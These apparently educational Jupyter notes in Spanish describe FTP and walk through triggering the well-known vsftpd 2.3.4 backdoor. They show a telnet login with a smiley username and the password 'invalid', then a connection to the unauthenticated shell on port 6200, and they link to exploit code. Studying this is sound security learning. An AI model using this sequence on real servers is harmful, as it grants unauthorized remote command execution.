{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# FTP (Protocolo de transferencia de archivos)\n",
    "\n",
    "Basado en una arquitectura cliente-servidor, este protocolo transfiere archivos por medio de una red TCP; para lo cual utiliza un puerto TCP 21."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Vulnerabilidad\n",
    "Al inicio los desarrolladores pusieron un backdoor con el objetivo de poder entrar al servidor para hacer las respectivas actualizaciones del sistema. Actualmente, el backdoor se encuentra parchado.\n",
    "\n",
    "El backdoor funciona haciendo una conexión telnet al puerto 21 de la máquina que aún tiene una versión antigua del servicio (ej: vsftpd 2.3.4), se descubrió que solo había un usuario y contraseña que estaban quemados en el código: User: \\*:) y password: invalid, por lo que se puede ingresar cualquier usuario desde que termine en \":)\" y la contraseña debe ser invalid para poder acceder sin problema a la máquina.\n",
    "\n",
    "`$ telnet <IP de la máquina a atacar> 21`\n",
    "\n",
    "`Trying <IP>...`\n",
    "\n",
    "`Connected to <IP>.`\n",
    "\n",
    "`Escape character is '^]'.`\n",
    "\n",
    "`220 (vsFTPd 2.3.4)`\n",
    "\n",
    "`user cualquiera:)`\n",
    "\n",
    "`331 Please specify the password.`\n",
    "\n",
    "`pass invalid`\n",
    "\n",
    "`^]` // ctrl + 5, si se hace de otra manera lo toma como string no como escape.\n",
    "\n",
    "`telnet> quit`\n",
    "\n",
    "`Connection closed.`\n",
    "\n",
    "Esto abre el puerto 6200 donde se puede conectar por telnet sin necesidad de usuario ni contraseña.\n",
    "\n",
    "`$ telnet <IP> 6200`\n",
    "    \n",
    "`Trying <IP>...`\n",
    "    \n",
    "`Connected to <IP>.`\n",
    "    \n",
    "`Escape character is '^]'.`\n",
    "\n",
    "**Nota:** Cada comando que se haga debe estar terminado por \";\"."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploit\n",
    "**Descripción:** VSFTPD v2.3.4 Backdoor Command Execution\n",
    "\n",
    "Para Unix utilizando la arquitectura de comandos.\n",
    "\n",
    "Este exploit abre el backdoor(descrito anteriormente) instalado en algunos servidores FTP viejos.\n",
    "\n",
    "[Código del exploit](https://pastebin.com/AetT9sS5)\n",
    "\n",
    "\\[Pendiente a revisar a profundidad el código\\]"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
